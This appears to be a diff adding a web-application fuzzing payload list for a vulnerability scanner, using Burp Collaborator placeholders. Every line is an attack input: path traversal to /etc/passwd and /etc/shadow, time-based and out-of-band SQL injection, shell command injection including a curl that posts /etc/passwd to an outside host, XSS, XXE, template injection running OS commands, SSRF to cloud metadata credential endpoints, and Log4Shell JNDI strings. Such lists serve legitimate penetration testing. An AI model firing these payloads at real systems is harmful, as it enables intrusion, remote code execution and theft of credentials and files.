@@ -1,0 +1,410 @@
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+c:\windows\win.ini
+../../../../../../../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini
+../../../../../../../../../../../../../../../../winnt/win.ini
+\windows\win.ini
+file:///c:/windows/win.ini
+...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini
+.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\windows/win.ini
+...\./...\./...\./...\./...\./...\./...\./...\./...\./...\./windows/win.ini
+À®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀÀ®À®ÀwindowsÀwin.ini
+/etc/passwd
+file:///etc/passwd
+..././..././..././..././..././..././..././..././..././..././etc/passwd
+À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.\..\..\boot.ini
+../../../../../../../../../../../../../../../../../../../../win.ini
+%00../../../../../../../../../../../../../../../../../../../../etc/passwd
+%00../../../../../../../../../../../../../../../../../../../../etc/shadow
+%00/etc/passwd%00
+%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%5c..%\..%\..%\..%\..%\boot.ini
+%/..%/..%/..%/..%/..%/..%/..%/..%/..%/..%/..%/..%/..%/..%2f..%\..%\..%\..%\..%\..%5cboot.ini
+%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\..%\etc/passwd%00
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+1'+sleep(20.to_i)+'
+1"+sleep(20.to_i)+"
+1'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+1"+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+"
+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
+1'.sleep(20).'
+1".sleep(20)."
+{${sleep(20)}}
+sleep(20)
+response.write 1337
+:response.write 1337
+<name>','')); phpinfo(); exit;/*</name>
+<BURP_COLLABORATOR_HOST>
+&#10;
+&#10;&#13;
+&#13;
+&#13;&#10;
+"
+X-Injection-Header: NSTEST"
+%E5%98%8A%E5%98%8DX-Injection-Header:NSTEST
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('NSTEST');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+/ㅤ/-[ﾠ=''],ﾠ‌=!ﾠ+ﾠ,ﾠ‌‌=!ﾠ‌+ﾠ,ﾠ‌‌‌=ﾠ+{},ﾠ‌‌‌‌=ﾠ‌[ﾠ++],ﾠ‌‌‌‌‌=ﾠ‌[ﾠ‌‌‌‌‌‌=ﾠ],ﾠ‌‌‌‌‌‌‌=++ﾠ‌‌‌‌‌‌+ﾠ,ﾠﾠ=ﾠ‌‌‌[ﾠ‌‌‌‌‌‌+ﾠ‌‌‌‌‌‌‌],ﾠ‌[ﾠﾠ+=ﾠ‌‌‌[ﾠ]+(ﾠ‌.ﾠ‌‌+ﾠ‌‌‌)[ﾠ]+ﾠ‌‌[ﾠ‌‌‌‌‌‌‌]+ﾠ‌‌‌‌+ﾠ‌‌‌‌‌+ﾠ‌[ﾠ‌‌‌‌‌‌]+ﾠﾠ+ﾠ‌‌‌‌+ﾠ‌‌‌[ﾠ]+ﾠ‌‌‌‌‌][ﾠﾠ](ﾠ‌‌[ﾠ]+ﾠ‌‌[ﾠ‌‌‌‌‌‌]+ﾠ‌[ﾠ‌‌‌‌‌‌‌]+ﾠ‌‌‌‌‌+ﾠ‌‌‌‌+"(ﾠ)")()
+';!--"<NSTEST>=&{()}&#060;&LT;&lt;&ltʺ＞＜ns\u003C
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://<BURP_COLLABORATOR_HOST>/xss.htc"><xss:xss>NSTEST</xss:xss></HTML>
+<![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('NSTEST');">]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+[a](javascript:prompt(1337))
+"""><script src=//<BURP_COLLABORATOR_HOST>></script>"
+¼script¾alert(¢NSTEST¢)¼/script¾
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1337`'> 
+[[constructor.constructor('alert(1337)')()]]
+{{constructor.constructor('alert(1337)')()}}
+/Default.aspx
+_$$ND_FUNC$$_function (){require('child_process').exec('ping <BURP_COLLABORATOR_HOST>');}()
+NS${191*7}TEST
+#set ($a=191*7) NS${a}TEST
+${@java.lang.Thread@sleep(10000)}
+%99999999999s
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+{__schema{types{name}}}
+Host: <SERVER>@<BURP_COLLABORATOR_HOST>
+Host: <BURP_COLLABORATOR_HOST>
+65536
+268435455
+2147483647
+nstest)(objectClass=*
+nstest)(!(objectClass=*)
+*)(objectClass=*
+*)(!(objectClass=*)
+x' or name()='<USERNAME>' or 'x'='y
+*()|%26'
+*()|&'
+*(|(mail=*))
+*|
+NSTEST
+{ "$gte": 0 }
+[$ne]=nstest
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+';sleep(5000);
+${"NMTEMT".toString().replace("M", "S")}
+@<BURP_COLLABORATOR_HOST>/
+' OR 1--
+"<BURP_COLLABORATOR_HOST>
+"
+1|nslookup -q=cname http://<BURP_COLLABORATOR_HOST>&
+"""`0&nslookup -q=cname <BURP_COLLABORATOR_HOST>&`'"
+1 &nslookup -q=cname <BURP_COLLABORATOR_HOST>.&'\"`0&nslookup -q=cname <BURP_COLLABORATOR_HOST>.&`'
+1 |echo NSTEST NSTEST1||a #' |echo NSTEST NSTEST1||a #|" |echo NSTEST NSTEST1||a #
+1 &echo NSTEST NSTEST1&
+1 "|echo NSTEST NSTEST1 ||
+1 '|echo NSTEST NSTEST1 #xzwx
+1 ;echo NSTEST NSTEST1;
+%0aecho NSTEST NSTEST1%0a
+1|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+1 |ping -c 21 127.0.0.1||x
+1 &ping -n 21 127.0.0.1&
+1 '|ping -c 21 127.0.0.1 #
+1 "|ping -n 21 127.0.0.1 ||
+1 &ping -c 21 127.0.0.1&
+"
+ping -c 21 127.0.0.1
+"
+$(ping -c 21 127.0.0.1)
+1 || ping -i 21 127.0.0.1 || ping -n 21 127.0.0.1 &
+1 | ping -i 21 127.0.0.1
+1 | ping -n 21 127.0.0.1
+whoami && ping -n 21 127.0.0.1 && ping -i 21 127.0.0.1
+1 & ping -i 12 127.0.0.1 &
+1 & ping -n 21 127.0.0.1 &
+1 ; ping -n 30 127.0.0.1 ;
+1 ; ping -i 30 127.0.0.1 ;
+`ping <BURP_COLLABORATOR_HOST>`
+1 & id
+1 | id
+1 ; id
+%0a id %0a
+`id`
+/usr/bin/id
+`/u??/b??/i?`
+ $(sleep 50)
+ 'sleep 50'
+ timeout 50
+echo 1337
+1 | curl --data @/etc/passwd <BURP_COLLABORATOR_HOST>
+;system('/usr/bin/id')
+;system('cat /etc/passwd')
+;system('id')
+;|/usr/bin/id|
+XXXXX`perl -e 'print ".%p" x 80'`
+/u's'r/bi'n/i'd
+\/u\s\r\/b\i\n/i\d
+$(s\l'ee'p 50)
+1 | dir
+1 & dir
+1&& dir
+ echo $((191*7))
+1; echo $((191*7))
+1& echo $((191*7))
+id&& echo $((191*7))
+1| echo $((191*7))
+1|| echo $((191*7))
+' echo $((191*7))
+'; echo $((191*7))
+' & echo $((191*7))
+' && echo $((191*7))
+' | echo $((191*7))
+' || echo $((191*7))
+""" echo $((191*7))"
+"""; echo $((191*7))"
+""" & echo $((191*7))"
+""" && echo $((191*7))"
+""" | echo $((191*7))"
+""" || echo $((191*7))"
+ echo $((191*7)) #
+1; echo $((191*7)) #
+1& echo $((191*7)) #
+id&& echo $((191*7)) #
+1| echo $((191*7)) #
+1|| echo $((191*7)) #
+/crossdomain.xml
+/clientaccesspolicy.xml
+data://text/plain;base64,PD9waHAgZWNobyAnTlNfVEVTVF8xMzM3JzsgPz4K
+${sleep(10)}
+${phpinfo()}
+/nstest.txt
+الله هو كل شيء ، لا يهم الله الذي تختاره ﷽ﷻﷺ
+/robots.txt
+-->'-->`--><!--#set var=gmm" value="NSTEST"--><!--#set var="ioo" value="NSTEST2"--><!--#echo var="gmm"--><!--#echo var="ioo"--><!--#exec cmd="nslookup -q=cname <BURP_COLLABORATOR_HOST>" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="timeout 10" -->
+<!--#include virtual="http://<BURP_COLLABORATOR_HOST>" -->
+<!--#exec cmd="/usr/bin/id" -->
+<!--#exec cmd="dir" -->
+<!--#exec cmd="sleep 10" -->
+NS<%= 191*7 %>TEST
+191*7{191*7}{{191*7}}{{191*'7'}}${{191*7}}
+{{=191*7}}
+{php}echo `id`;{/php}
+"""+(function(){if(typeof yljtl==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);yljtl=1;}}())+"""
+"""+(function(){if(typeof x3ah8===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);x3ah8=1;}}())+'"""
+;response.end('NSTEST')
+require("child_process").exec("ping <BURP_COLLABORATOR_HOST>");
+res.end('NSTEST')
+"%0d%0aBCC:<BURP_COLLABORATOR_EMAIL>
+%0d%0adxo: w"
+">
+%0d%0aBCC:<BURP_COLLABORATOR_EMAIL>
+%0d%0ajqw: h"
+<BURP_COLLABORATOR_EMAIL>%0aCc:<BURP_COLLABORATOR_EMAIL>
+<BURP_COLLABORATOR_EMAIL>%0d%0aCc:<BURP_COLLABORATOR_EMAIL>
+<BURP_COLLABORATOR_EMAIL>%0aBcc:<BURP_COLLABORATOR_EMAIL>
+<BURP_COLLABORATOR_EMAIL>%0d%0aBcc:<BURP_COLLABORATOR_EMAIL>
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<BURP_COLLABORATOR_EMAIL>%0aRCPT+TO:+<BURP_COLLABORATOR_EMAIL>%0aDATA%0aFrom:+<BURP_COLLABORATOR_EMAIL>%0aTo:+<BURP_COLLABORATOR_EMAIL>%0aSubject:+tst%0afoo%0a%2e%0a
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<BURP_COLLABORATOR_EMAIL>%0d%0aRCPT+TO:+<BURP_COLLABORATOR_EMAIL>%0d%0aDATA%0d%0aFrom:+<BURP_COLLABORATOR_EMAIL>%0d%0aTo:+<BURP_COLLABORATOR_EMAIL>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+<BURP_COLLABORATOR_EMAIL>
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nstest SYSTEM "http://<BURP_COLLABORATOR_HOST>">%nstest;]>'),'/l') from dual)
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nstest SYSTEM "http://<BURP_COLLABORATOR_HOST>">%nstest;]>'),'/l') from dual)||'
+;declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST>\big'; exec master.dbo.xp_dirtree @q;-- 
+';declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\pqc'; exec master.dbo.xp_dirtree @q;-- 
+);declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\vlv'; exec master.dbo.xp_dirtree @q;-- 
+');declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\pbg'; exec master.dbo.xp_dirtree @q;-- 
+, 1);declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\qab'; exec master.dbo.xp_dirtree @q;-- 
+, 1, 2);declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\sxf'; exec master.dbo.xp_dirtree @q;-- 
+, 1, 2, 3);declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\spj'; exec master.dbo.xp_dirtree @q;-- 
+));declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\vwi'; exec master.dbo.xp_dirtree @q;-- 
+', '1');declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\hrj'; exec master.dbo.xp_dirtree @q;-- 
+', '1', '2');declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\okm'; exec master.dbo.xp_dirtree @q;-- 
+', '1', '2', '3');declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST_HALF_LINK>'+'<BURP_COLLABORATOR_HOST_ANOTHER_HALF_LINK>\ozv'; exec master.dbo.xp_dirtree @q;-- 
+'));declare @q varchar(99);set @q='\\<BURP_COLLABORATOR_HOST>\qbc'; exec master.dbo.xp_dirtree @q;-- 
+(select load_file('\\\\<BURP_COLLABORATOR_HOST>\\ayn'))
+'+(select load_file('\\\\<BURP_COLLABORATOR_HOST>\\gna'))+'
+ into outfile '\\\\<BURP_COLLABORATOR_HOST>\\zje'; -- 
+' into outfile '\\\\<BURP_COLLABORATOR_HOST>\\eme'; --
+'
+\'
+'
+\'
+'
+\'
+(select*from(select(sleep(20)))a)'
+ '+(select*from(select(sleep(20)))a)+'
+ and (select*from(select(sleep(20)))a)-- 
+,(select*from(select(sleep(20)))a)
++(select*from(select(sleep(20)))a)--  
+)and (select*from(select(sleep(20)))a)-- 
+))and (select*from(select(sleep(20)))a)-- 
+ waitfor delay'0:0:20'--
+)waitfor delay'0:0:20'--
+,0)waitfor delay'0:0:20'--
+,0,0)waitfor delay'0:0:20'--
+,0,0,0)waitfor delay'0:0:20'--
+10639681' or '8915'='8915
+86274261' or '8989'='8992
+96233688' or 8519=8519-- 
+37144146' or 6981=6983-- 
+and '1623'='1623
+and '2504'='2505
+and 1011=1011-- 
+and 1927=1930-- 
+""""
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+'||Utl_Http.request('http://<BURP_COLLABORATOR_HOST>') from dual--
+1||Utl_Http.request('http://<BURP_COLLABORATOR_HOST>') from dual--
+""" or ""ns""=""ns"
+"""; waitfor delay '0:00:30'--"
+""" or sleep(30)#"
+""" or benchmark(10000000,MD5(1))#"
+""" or pg_sleep(30)--"
+""" or substr(upper(hex(randomblob(55555555))),0,1) --"
+""" and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,10)--"
+'||+SYS.DATABASE_NAME+||'
+'--
+' or 1 in (@@version)--
+1 or 1 in (@@version)--
+' or sleep(30)#
+1 or sleep(30)#
+1 or benchmark(2000000000,MD5(1))#
+' or benchmark(2000000000,MD5(1))#
+1 or pg_sleep(30)--
+' or pg_sleep(30)--
+""" or 0=0 #"
+""" or 1=1 or """"="""
+""" or 1=1--"
+X-Forwarded-Host: <BURP_COLLABORATOR_HOST>
+http://<BURP_COLLABORATOR_HOST>/
+"X-Forwarded-For: <BURP_COLLABORATOR_HOST>
+True-Client-IP: <BURP_COLLABORATOR_HOST>
+X-Real-IP: <BURP_COLLABORATOR_HOST>
+http://<BURP_COLLABORATOR_HOST>/
+X-WAP-Profile: http://<BURP_COLLABORATOR_HOST>/wap.xml
+X-Scraped: <BURP_COLLABORATOR_HOST>"
+/trace.axd
+田中さんにあげて下さい和製漢語部落格🆗 🆙 💗 💖 💘 💝 💟 💜 💛 💚 💙
+𝕿𝖊𝖘𝕿𝖎𝖓𝖌
+0˙ᄅ/ʇsᴉ˥¿zznℲsN
+//
+//*
+@*
+<bym xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://<BURP_COLLABORATOR_HOST>/bym.xsd">bym</bym>
+<nuj xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://<BURP_COLLABORATOR_HOST>/foo"/></nuj>
+]]>><
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://<BURP_COLLABORATOR_HOST>">]><foo>&xxe;</foo>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('c:/windows/win.ini')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('c:/windows/win.ini')"/></xsl:template></xsl:stylesheet>
+N̯̱̣͇̖̦̦̣ͥͮͩͪ̐͑͂̈̅ͦ͋̆̔͆̀̆̀̚̚̕s̶̛̛̤̣̩̘͔̥̻̮̣͊̓̉̈́̄̊́̚͝Ţ̵̟̖̳͔̫͈̯͚̱̭͎̝͈̋̆ͣͣͮ͑͊ͤͩ̂̈́ͧͮ̈́̏͢͡ͅE̢̡̫̞͚͈̺̘̬̹̪͕̯̥̹͙̘̓̊̇͑̏́̕Ś̵̨̛̫̞̳̼̩̹̮̠̞̖̯̞̳̪̖ͮ̿͊ͭ̄̚̕ͅT̨̜̺̼̺̬̱̱̝͇̱̤̠̼̳͖͐̿ͬ͒̏͝͞
+nstest' and FUNCTION('(select count(1) from table where 1=1)>0 and length','qq')=2 and 'a' = 'a
+nstest\'' or 1<length((select 1 from table where 1=1)) --
+nstest' and array_upper(xpath('row',query_to_xml('select 1 where 1337>1',true,false,'')),1)=1 and '1'='1
+nstest' and NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 from dual where 1337>1*')),'1')!='1' and '1'='1
+nstest' and  '1'='1'' and (select 1 where 1=1) = ''1' and '1'='1
+nstest' and "a'='a' and (select 8 where 1=1)=8 and 'bb"='bb
+nstest' and SQL('(SELECT 1)=1') and '1'='1
+nstest' or 1<LEN( (select top 1 name from table where 1=1))or'1'='11
+nstest\' or 1=sleep(30) -- x
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http://[::]:80/
+http://[::]:25/ 
+http://[::]:22/ 
+http://[::]:3128/ 
+http://0000::1:80/
+http://0000::1:25/ 
+http://0000::1:22/ 
+http://0000::1:3128/ 
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://0177.0.0.1/
+http://2130706433/
+http://3232235521/
+http://3232235777/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+<Svg OnNs OnLoad=alert`1337`>
+<dialog open onclose=alert(1337)><form method=dialog><button>XSS</button></form>
+<iframe src="//<BURP_COLLABORATOR_HOST>/xss.php?a=<svg onload=alert(1337)>" style=display:none></iframe>
+"Location://x:1
+Content-Type:text/html
+
+<script>alert(1337)</script>"
+{{constructor.constructor('alert(1337)')()}}<x ng-app>{{constructor.constructor('alert(1337)')()}}
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+substring(//user[userid=5]/username,2,1)=CHAR_HERE
+substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/lateshttp://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/documentt/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/openstack
+http://169.254.169.254/2009-04-04/meta-data/ 
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+{{['whoami']|filter('system')}}
+{{['ping <BURP_COLLABORATOR_HOST>']|filter('system')}}
+{{'nstest'.toUpperCase()}}
+@(1336+1)
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(1337)//'>
+NS${{ request }}
+NS${{ session }}
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("jav a.lang.Runtime")).exec(""ping <BURP_COLLABORATOR_HOST>")}
+NS${request.getServletContext().getResource("/")}
+${facesContext.getExternalContext().setResponseHeader("NSTEST",request)}
+"${facesContext.getExternalContext().setResponseHeader(“NSTEST”,
+“”.getClass().forName(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“Ja
+vaScript”).eval(\”var x=new java.lang.ProcessBuilder;
+x.command(\\\”ping\\\”,\\\”<BURP_COLLABORATOR_HOST>\\\”);
+org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\”))}"
+"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByN
+ame(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""ping <BURP_COLLABORATOR_HOST>\\\"")""))}'"
+<audio controls onprogress=alert(1337)><source src=validaudio.mp3 type=audio/mpeg></audio>
+().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('ping+<BURP_COLLABORATOR_HOST>').read()
+().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('whoami').read()
+.__class__.__mro__[-1].__subclasses__()[128].__init__.__globals__["".join(["m", "e", "t", "s", "y", "s"][::-1])]('ping+<BURP_COLLABORATOR_HOST>')
+.__class__.__mro__[-1].__subclasses__()[128].__init__.__globals__["".join(["m", "e", "t", "s", "y", "s"][::-1])]("whoami")
+\input{|"ping <BURP_COLLABORATOR_HOST>"}
+\input|whoami|base64
+\immediate\write18{env | base64 > test.tex}
+\verbatiminput{/etc/passwd}
+\url{javascript:alert(1337)}
+\href{javascript:alert(1337)}{Click here}
+{__schema{types{name,fields{name}}}}
+/server-status
+*)(uid=*))(|(uid=*
+${jndi:ldap://nstest${sys:java.version}nstest.<BURP_COLLABORATOR_HOST>/exp}
+${jndi:ldap://127.0.0.1#nstest${sys:java.version}nstest.<BURP_COLLABORATOR_HOST>/exp}
